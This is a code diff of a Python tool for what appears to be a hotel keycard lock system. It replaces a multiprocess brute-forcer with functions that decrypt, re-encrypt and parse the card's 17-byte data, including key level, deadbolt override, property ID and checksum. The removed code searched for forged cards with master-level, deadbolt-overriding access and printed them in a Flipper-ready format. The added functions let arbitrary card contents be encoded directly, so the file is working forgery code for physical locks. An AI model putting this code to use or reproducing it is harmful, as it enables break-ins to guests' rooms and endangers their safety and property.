@@ -49,228 +49,220 @@ KEY_LEVELS = [
 PRINT_LOCK = multiprocessing.Lock()
 STATUS_QUEUE = multiprocessing.Queue()
 
-def worker(bytes_to_change,worker_number,minimum_bytes=1):
-    """
-    bytes_to_change: number of bytes to try changing to get a result
-    minimum_bytes: by default we change anywhere between 1 and bytes_to_change
-        in the ciphertext. This sets a lower bound
-    worker_number: for housekeeping and printing who found the key (so they can
-        get a prize)
-    """
+def decrypt_card(ecard_data):
+    # Where we put the decrypted card data
+    dc = []
 
-    # Keep track of iterations
-    iter_count = 0
+    # Setup
+    length = 17
 
-    # Main loop
-    while True:
+    # Stage 1??
+    for i in range(0, length):
+        num = DECODE_ARRAY[ecard_data[i]] - (i + 1)
+        if num < 0:
+            num += 256
+        dc.append(num)
 
-        # Encrypted Card data
-        strCard = [
-            0x64, 0xC0, 0x6F, 0x56, 0x13, 0x69, 0x20, 0xDB, 0x8B, 0x04, 0xE9, 0x32, 0x34, 0x0F, 0xA4, 0xA0,
-            0x8A
-        ]
+    # Stage 2
+    bob = dc[10]
+    # Alice = bob's lsigdig
+    alice = bob & 1
 
-        ###
-        # Some notes
-        # * byte 14 seems to correlate strongly to seq/combination number.
+    # Stage 3
+    # I'm using names here to hopefully make it easier to follow than num1, num2, etc.
+    for zeta in range(17, 0, -1):
+        bob = dc[zeta - 1]
+        for xi in range(8, 0, -1):
+            yip = zeta + xi
+            if(yip > length):
+                yip -= length
+            charlie = dc[yip - 1]
+            # print(f"charlie({charlie:02x}) = dc[yip({yip:02x}) - 1]")
+            # save msigdig from charlie
+            david   =  (charlie & 0x80) >> 7
+            # print(f"david({david:02x})   =  (charlie({charlie:02x}) & 0x80) >> 7")
+            # double charlie, truncate, add alice to the end
+            charlie = ((charlie << 1) & 0xFF) | alice
+            # print(f"charlie({charlie:02x}) = ((charlie({charlie:02x}) << 1) & 0xFF) | alice({alice:02x})")
+            # alice becomes bob's msigdig
+            alice   =  (bob & 0x80) >> 7
+            # print(f"alice({alice:02x})   =  (bob({bob:02x}) & 0x80) >> 7")
+            # bob get's charlie's msigdig
+            bob     = ((bob << 1) & 0xFF) | david
+            # print(f"bob({bob:02x})     = ((bob({bob:02x}) << 1) & 0xFF) | david({david:02x})")
 
-        # Pick a random bytes to change (we may accidentally change the same ones)
-        cbyte = randint(minimum_bytes, bytes_to_change)
+            dc[yip - 1] = charlie
+            # print(f"dc[yip({yip:02x})] = charlie({charlie:02x})")
+        dc[zeta - 1] = bob
+        # print(f"dc[zeta({zeta:02x})] = bob({bob:02x})")
 
-        # Don't re-use the same byte numbers
-        available_pos = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,16]
+    return dc
 
-        # Keep track of what we've picked already, we can put specific bytes here
-        # if we want to target them for better effect.
-        chosen_pos = [14, 15]
+def encrypt_card(dcard_data):
 
-        # Pick cbyte random byte positions from the list
-        for _ in range(0,cbyte - 2):
-            # Pick which element of our available_pos to use
-            pos = randint(0,len(available_pos) - 1)
-            pick = available_pos.pop(pos)
+    ec = []
+
+    length = 17
+    alice = 1 # ??? not sure how this would be set, it doesn't seem to matter, which is weird...
+
+    for zeta in range(1, 18):
+        bob = dcard_data[zeta - 1]
+        for xi in range(1, 9):
+            yip = zeta + xi
+            if(yip > length):
+                yip -= length
+            charlie = dcard_data[yip - 1]
+            # Retrieve charlie's lsigdig aka david
+            david   =  bob & 1
+            # Put bob back together
+            bob     = (bob >> 1) | (alice << 7)
+            # Get alice back
+            alice   =  charlie & 1
+            # Put charlie back together
+            charlie = (charlie >> 1) | (david << 7)
+            dcard_data[yip - 1] = charlie
+        dcard_data[zeta - 1] = bob
+
+    # This works. No need to do anything here
+    for i in range(0, length):
+        num = dcard_data[i] + (i + 1)
+        if num >= 256:
+            num -= 256
+        ec.append(DECODE_ARRAY.index(num))
+
+    return ec
+
+def decode_card(dcard_data):
+
+    # Here's where we figure out what each byte does
+    card = {}
+
+    # Byte 0
+    card['key_level_no'], card['key_level_text'] = KEY_LEVELS[(dcard_data[0] & 0xF0) >> 4]
+    card['led_warning'] = (dcard_data[0] & 0x08) >> 3
+
+    # Byte 1
+    card['key_id'] = dcard_data[1]
+
+    # Byte 2 & 3
+    card['key_record_high'] = dcard_data[2] & 0x7F
+    card['opening_key'] = (dcard_data[2] & 0x80) >> 7
+    card['key_record'] = (card['key_record_high'] << 8) | dcard_data[3]
+
+    # Byte 5 & 6
+    card['sequence_combination_number'] = ((dcard_data[5] & 0x0F) << 8) | dcard_data[6]
+
+    # Property ID and year, bytes 14 & 15
+    card['creation_year_bits'] = (dcard_data[14] & 0xF0)
+    card['property_id'] = ((dcard_data[14] & 0x0F) << 8) | dcard_data[15]
+
+    # Byte 7 override deadbolt and days
+    card['override_deadbolt'] = (dcard_data[7] & 0x80) >> 7
+    card['restricted_weekday'] = dcard_data[7] & 0x7F
+
+    card['interval_year'] = dcard_data[8] >> 4
+    card['interval_month'] = dcard_data[8] & 0x0f
+    card['interval_day'] = (dcard_data[9] >> 3) & 0x1F
+    card['interval_hour'] = ((dcard_data[9] & 0x07) << 2) | (dcard_data[10] >> 6)
+    card['interval_minute'] = dcard_data[10] & 0x3F
+
+    card['creation_year'] = (((dcard_data[11] & 0xF0) >> 4) + 1980) | card['creation_year_bits']
+    card['creation_month'] = dcard_data[11] & 0x0F;
+    card['creation_day'] = (dcard_data[12] >> 3) & 0x1F;
+    card['creation_hour'] = ((dcard_data[12] & 0x07) << 2) | (dcard_data[13] >> 6);
+    card['creation_minute'] = dcard_data[13] & 0x3F;
+
+    checksum = dcard_data[16]
+
+    # Let's validate the checksum
+    csum = 0
+
+    # Duh, checksum isn't part of the checksum, hence 16 instead of 17
+    for i in range(0, 16):
+        csum += dcard_data[i]
+
+    csum = 255 - (csum & 0xff)
+
+    csum_pass = checksum == csum
+
+    card['csum_pass'] = csum_pass
+    card['checksum'] = checksum
+
+    return card
 
 
-            # For the output
-            chosen_pos.append(pick)
-
-        for p in chosen_pos:
-            # Generate a random byte
-            b = randint(0,255)
-            strCard[p] = b
-
-        # Where we put the decrypted card data
-        dc = []
-
-        # Setup
-        length = 17
-
-        # Stage 1??
-        for i in range(0, length):
-            num = DECODE_ARRAY[strCard[i]] - (i + 1)
-            if num < 0:
-                num += 256
-            dc.append(num)
-
-        # Stage 2
-        bob = dc[10]
-        alice = bob & 1 #Even/odd thingy
-
-        # Stage 3
-        # I'm using names here to hopefully make it easier to follow than num1, num2, etc.
-        for zeta in range(17, 0, -1):
-            bob = dc[zeta - 1]
-            for xi in range(8, 0, -1):
-                yip = zeta + xi
-                if(yip > length):
-                    yip -= length
-                charlie = dc[yip - 1]
-                david = (charlie & 0x80) >> 7
-                charlie = ((charlie << 1) & 0xFF) | alice
-                alice = (bob & 0x80) >> 7
-                bob =  ((bob << 1) & 0xFF) | david
-                dc[yip - 1] = charlie
-            dc[zeta - 1] = bob
-
-        # Here's where we figure out what each byte does
-
-        # Byte 0
-        key_level_no, key_level_text = KEY_LEVELS[(dc[0] & 0xF0) >> 4]
-        led_warning = (dc[0] & 0x08) >> 3
-
-        # Byte 1
-        key_id = dc[1]
-
-        # Byte 2 & 3
-        key_record_high = dc[2] & 0x7F
-        opening_key = (dc[2] & 0x80) >> 7
-        key_record = (key_record_high << 8) | dc[3]
-
-        # Byte 5 & 6
-        sequence_combination_number = ((dc[5] & 0x0F) << 8) | dc[6]
-
-        # Property ID and year, bytes 14 & 15
-        creation_year_bits = (dc[14] & 0xF0)
-        property_id = ((dc[14] & 0x0F) << 8) | dc[15]
-
-        # Byte 7 override deadbolt and days
-        override_deadbolt = (dc[7] & 0x80) >> 7
-        restricted_weekday = dc[7] & 0x7F
-
-        interval_year = dc[8] >> 4
-        interval_month = dc[8] & 0x0f
-        interval_day = (dc[9] >> 3) & 0x1F
-        interval_hour = ((dc[9] & 0x07) << 2) | (dc[10] >> 6)
-        interval_minute = dc[10] & 0x3F
-
-        creation_year = (((dc[11] & 0xF0) >> 4) + 1980) | creation_year_bits
-        creation_month = dc[11] & 0x0F;
-        creation_day = (dc[12] >> 3) & 0x1F;
-        creation_hour = ((dc[12] & 0x07) << 2) | (dc[13] >> 6);
-        creation_minute = dc[13] & 0x3F;
-
-        checksum = dc[16]
-
-        # Let's validate the checksum
-        csum = 0
-
-        # Duh, checksum isn't part of the checksum, hence 16 instead of 17
-        for i in range(0, 16):
-            csum += dc[i]
-
-        csum = 255 - (csum & 0xff)
-
-        csum_pass = checksum == csum
-
-        # print("Iteration {}".format(iter_count))
-        iter_count += 1
-
-        # keep a count of iterations, I have no clue if this really works
-        if iter_count % 1000:
-            STATUS_QUEUE.put(iter_count)
-
-        # Conditions. Modify these to match what you're targeting.
-        if (
-                key_level_no == 13 and
-                #interval_month == 0 and 
-                interval_year > 1 and 
-                override_deadbolt == 1 and
-                opening_key == 1 and
-                #restricted_weekday == 0 and
-                #creation_year == 2025 and
-                sequence_combination_number == 0xfff and
-                property_id == 1142 and
-                csum_pass
-        ):
-            # Using print lock so procs don't step on eachother
-            with PRINT_LOCK:
-                # Print the actual contents of the card in Flipper friendly format
-                encoded_output = ""
-                for byte in strCard:
-                    encoded_output += f"{byte:02x} "
-
-                message = (
-                    f"KEY FOUND: Proc-> {worker_number} Itr->{iter_count} Cbyte->{cbyte} Pos->{chosen_pos}\n"
-                    f"{encoded_output}\n"
-                    f"----BEGIN KEY INFO----\n"
-                    f"Key Level ({key_level_no}): {key_level_text}\n"
-                    f"LED Warn: {led_warning}\n"
-                    f"Key ID: 0x{key_id:02x}\n"
-                    f"Opening key: {opening_key}\n"
-                    f"Key Record: {key_record:04x}\n"
-                    f"Seq. combination: 0x{sequence_combination_number:03x}\n"
-                    f"Creation yr. bits: {creation_year_bits}\n"
-                    f"Property ID: {property_id}\n"
-                    f"Override deadbolt: {override_deadbolt}\n"
-                    f"Restricted days (mtwtfss): {restricted_weekday:07b}\n"
-                    f"Valid for (YYYY/MM/DDThm): {interval_year:04}/{interval_month:02}/{interval_day:02}T{interval_hour:02}:{interval_minute:02}\n"
-                    f"Creation (YYYY/MM/DDThh:mm): {creation_year:04}/{creation_month:02}/{creation_day:02}T{creation_hour:02}:{creation_minute:02}\n"
-                    f"Checksum: 0x{checksum:02x}\n"
-                    f"Computed checksum: 0x{csum:02x}\n"
-                    f"Checksum pass: {csum_pass}\n"
-                    f"----END KEY INFO----\n"
-                )
-
-                print(message)
+# message = (
+#     f"----BEGIN KEY INFO----\n"
+#     f"Key Level ({key_level_no}): {key_level_text}\n"
+#     f"LED Warn: {led_warning}\n"
+#     f"Key ID: 0x{key_id:02x}\n"
+#     f"Opening key: {opening_key}\n"
+#     f"Key Record: {key_record:04x}\n"
+#     f"Seq. combination: 0x{sequence_combination_number:03x}\n"
+#     f"Creation yr. bits: {creation_year_bits}\n"
+#     f"Property ID: {property_id}\n"
+#     f"Override deadbolt: {override_deadbolt}\n"
+#     f"Restricted days (mtwtfss): {restricted_weekday:07b}\n"
+#     f"Valid for (YYYY/MM/DDThm): {interval_year:04}/{interval_month:02}/{interval_day:02}T{interval_hour:02}:{interval_minute:02}\n"
+#     f"Creation (YYYY/MM/DDThh:mm): {creation_year:04}/{creation_month:02}/{creation_day:02}T{creation_hour:02}:{creation_minute:02}\n"
+#     f"Checksum: 0x{checksum:02x}\n"
+#     f"Computed checksum: 0x{csum:02x}\n"
+#     f"Checksum pass: {csum_pass}\n"
+#     f"----END KEY INFO----\n"
+# )
 
 if __name__ == "__main__":
-    procs = []
-    num_procs = 12
 
-    print(f"Starting key search with {num_procs} processes...")
+    # Encrypted Card data
+    ecard_data = [
+        0x64, 0xC0, 0x6F, 0x56, 0x13, 0x69, 0x20, 0xDB, 0x8B, 0x04, 0xE9, 0x32, 0x34, 0x0F, 0xA4, 0xA0,
+        0x8A
+    ]
+
+    print(f"{ecard_data}")
+
+    dcard_data = decrypt_card(ecard_data)
+
+    print(dcard_data)
+
+    ecard_data = encrypt_card(dcard_data)
+
+    print(f"{ecard_data}")
+            
 
     # Kick off some processes (threads don't help)
-    for pnum in range(num_procs):
-        proc = multiprocessing.Process(
-            target=worker, kwargs={
-                "bytes_to_change": 8,
-                "minimum_bytes": 5,
-                "worker_number": pnum,
-        })
-        procs.append(proc)
-        proc.start()
+    # for pnum in range(num_procs):
+    #     proc = multiprocessing.Process(
+    #         target=worker, kwargs={
+    #             "ecard_data": ecard_data,
+    #             "bytes_to_change": 8,
+    #             "minimum_bytes": 5,
+    #             "worker_number": pnum,
+    #     })
+    #     procs.append(proc)
+    #     proc.start()
 
-    # Track the stats
-    try:
-        total_iterations = 0
-        start_time = time.time()
-        while True:
-            time.sleep(10)
-            while not STATUS_QUEUE.empty():
-                try:
-                    stat = STATUS_QUEUE.get(block=False)
-                    total_iterations += stat
-                except queue.Empty:
-                    break
+    # # Track the stats
+    # try:
+    #     total_iterations = 0
+    #     start_time = time.time()
+    #     while True:
+    #         time.sleep(10)
+    #         while not STATUS_QUEUE.empty():
+    #             try:
+    #                 stat = STATUS_QUEUE.get(block=False)
+    #                 total_iterations += stat
+    #             except queue.Empty:
+    #                 break
 
-            # Putting this down here so we don't start with 0 iterations after 10 seconds
-            current_time = time.time()
-            elapsed_time = current_time - start_time
-            performance = total_iterations / elapsed_time
-            print("Elapsed: {:.2f}s | Iterations: {:,} | {:,}/sec".format(elapsed_time, total_iterations, int(performance)))
+    #         # Putting this down here so we don't start with 0 iterations after 10 seconds
+    #         current_time = time.time()
+    #         elapsed_time = current_time - start_time
+    #         performance = total_iterations / elapsed_time
+    #         print("Elapsed: {:.2f}s | Iterations: {:,} | {:,}/sec".format(elapsed_time, total_iterations, int(performance)))
 
-    except KeyboardInterrupt:
-        print("\nExiting...")
-        for proc in procs:
-            proc.terminate()
-            proc.join()
+    # except KeyboardInterrupt:
+    #     print("\nExiting...")
+    #     for proc in procs:
+    #         proc.terminate()
+    #         proc.join()
